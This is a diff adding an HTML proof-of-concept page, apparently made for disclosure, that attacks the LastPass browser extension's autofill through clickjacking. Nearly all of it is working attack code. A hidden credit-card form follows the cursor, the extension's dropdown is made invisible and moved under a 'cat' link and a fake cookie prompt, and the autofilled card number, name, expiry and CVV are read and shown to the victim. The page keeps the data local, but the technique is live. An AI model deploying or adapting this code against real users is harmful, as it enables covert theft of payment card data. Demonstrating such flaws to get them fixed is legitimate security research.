@@ -1,0 +1,145 @@
+<!doctype html>
+<html lang="en">
+<meta charset="utf-8" />
+<head>
+<title>Welcome to Mallory's website...</title>
+</head>
+<body>
+<div id='maincontainer' style='z-index:1000000; opacity: 1; pointer-events:none; position:absolute; top:0; left:0; width:100%; height:100%; background-color:#ffffff;'>
+<div style='width:100%; text-align: center;'>
+<div id='greet' style='height: 2em;'>
+  Hello! Let's play a fun game to show that I can steal your information.
+</div>
+<div>
+  <a id='thebutton' href='#'>Click me to see a cat!</a>
+</div>
+<div>
+  <img src='/dlproblem/cat.jpg' id='thecat' style='width:50px; opacity:0;'></img>
+</div>
+</div>
+
+<!-- A confirmation dialog to make user click. -->
+<div id='cookiesasker' style='background-color:#f0f0f0; position:absolute; top:0; width:100%; height:100%; text-align:center; border: 2px solid;'>
+  <div style='background-color:#333333; color:#eeeeee; position:absolute; width:400px; height:200px; top:50%; left:50%; transform: translate(-150px,-50px);'>
+    <p>Do you want some cookies? There's zero cookies on this page, but I just want to ask...</p>
+    <p><a id='confirmation-btn1' href='#' style='background-color:#555555; border: 1px solid; color:#bbbbff;'>Accept all cookies</a></p>
+  </div>
+</div>
+<div id='confirmation' style='background-color:#f0f0f0; position:absolute; width:400px; height:300px; top:50%; left:50%; transform: translate(-200px,-150px); text-align:center; border: 2px solid; opacity:0; vertical-align:middle;'>
+  <h3>Are you sure you want to see a cat?</h3><br><br>
+  <p><a id='confirmation-btn1' href='#' style='border: 1px solid;'>Yes!</a></p>
+</div>
+<div id='badnews' style='background-color:#f0f0f0; position:absolute; width:400px; height:200px; top:50%; left:50%; transform: translate(-200px,-150px); text-align:center; border: 2px solid; opacity:0; vertical-align:middle;padding:1em;'>
+</div>
+</div>
+
+<!-- A bait form that follows user's mouse to trigger opening Lastpass. -->
+<form id="baitform" action="" method="post" style='position: absolute;'>
+  <div>
+  <label style='display:block;width:200px;height:20px;' for="cc_number">Credit card number</label><br>
+  <input style='width:200px;height:40px;cursor: default !important;' type="text" id="cc_number" name="cc_number" placeholder="12222238">
+  <label for="cc_name">Name on the Card</label>
+  <input style='width:200px;height:40px;' type="text" id="cc_name" name="cc_name" placeholder="Harry Potter">
+  <label for="cc_issue_date">Expiry</label>
+  <input style='width:200px;height:40px;' type="text" id="cc_expiry_month" name="cc_expiry_month" placeholder='MM'>/ <input style='width:200px;height:40px;' type="text" id="cc_expiry_year" name="cc_expiry_year" placeholder='YYYY'>
+  <label for="cc_cvv">CVV</label>
+  <input type="text" id="cc_cvv" name="cc_cvv" placeholder="2018">
+  <h2>Billing Address</label>
+  <label for="cc_addr">Address</label>
+  <input type="text" id="cc_addr" name="cc_addr" />
+  <label for="cc_city">City</label>
+  <input type="text" id="cc_city" name="cc_city" />
+  <label for="cc_zip">ZIP code</label>
+  <input type="text" id="cc_zip" name="cc_zip" />
+  <button type="submit">Submit</button>
+  </div>
+</form>
+
+</body>
+<script>
+  var debug = false;
+  function reveal() {
+	  debug = true;
+	  document.querySelector('#maincontainer').style.opacity   =0.3;
+  }
+  function moveLP(el, x, y) {
+	  el.style.transform = 'translate('+x+'px,'+y+'px)'
+  }
+
+  function hideLPDialog(el) {
+	  el.style.opacity = debug ? 0.4 : 0.001;
+	  return;
+  }
+  // Make the 'bait' hidden input's password field follow the mouse.
+  document.onmousemove = (e) => {
+	  var el = document.querySelector('#baitform');
+	  el.style.left = e.clientX - 100 + 'px';
+	  el.style.top = e.clientY - 60 +'px';
+  };
+  // Just a trick to use another event loop to hide the Lastpass's iframe.
+  setInterval(() => {
+	  var el = getLPDialog();
+	  if (el) {
+		  hideLPDialog(el);
+	  }
+  }, 10);
+  
+  document.querySelector('#thebutton').onmouseenter = (e) => {
+	  var el = getLPDialog();
+	  if (el) {
+		  // I don't know where the dropdown is but I can calculate it using my inbox
+		  var baitform = document.querySelector('#baitform');
+		  var lp_posx = +baitform.style.left.replace(/px$/g,'');
+		  var lp_posy = +baitform.style.top.replace(/px$/g,'')+80;
+		  moveLP(el,
+			 -lp_posx+e.clientX-50,
+			 -lp_posy+e.clientY-50);
+		  document.querySelector('#maincontainer').style.pointerEvents = 'none';
+	  }
+  };
+
+  function getLPDialog() {
+	  var els = document.querySelectorAll('[data-lastpass-root]');
+	  if (els.length) return els[0]; else return null;
+  }
+  
+  // Can't detect whether lastpass dialog is up but all you need is to
+  // wait for the input field to be focused and wait for some time...
+  var waitingLPperinfo = document.querySelector('#cc_number').onfocus = (e) => {
+	  console.log('Bait focused');
+	  setTimeout(function() {
+		  var el = getLPDialog();
+		  console.log('Supposed Lastpass dropdown is on');
+		  if (el) {
+			  document.querySelector('#cookiesasker').remove();
+			  document.querySelector('#maincontainer').style.pointerEvents = 'auto';
+			  document.onmousemove = (e) => {
+				  var el = getLPDialog();
+//				  hideLPDialog(el);
+			  };
+		  }
+	  }, 200);
+  };
+
+  var breaknews = setInterval(function() {
+	  if (document.querySelector('#cc_number').value) {
+		  setTimeout(() => { // Wait for Lastpass to fill in everything.
+			  document.querySelector('#badnews').textContent = 'Hello, '+
+				  document.querySelector('#cc_name').value + '. ' +
+				  'Your credit card number is ' + document.querySelector('#cc_number').value + ', ' +
+				  'expiring on ' + document.querySelector('#cc_expiry_month').value + '/' + document.querySelector('#cc_expiry_year').value + 
+				  ' with CVV being ' + document.querySelector('#cc_cvv').value + '. ' +
+				  'This is not sent anywhere but you know the Lastpass browser extension is leaking your card.';
+			  document.querySelector('#badnews').style.opacity = 1;
+			  document.querySelector('#thecat').style.opacity = 0;
+			  document.querySelector('#greet').style.opacity = 0;
+			  document.querySelector('#thebutton').style.opacity = 0;
+			  clearInterval(breaknews);
+			  window.scrollTo(0, 0);
+		  }, 1500);
+	  }
+  }, 100);
+
+</script>
+</html>
+
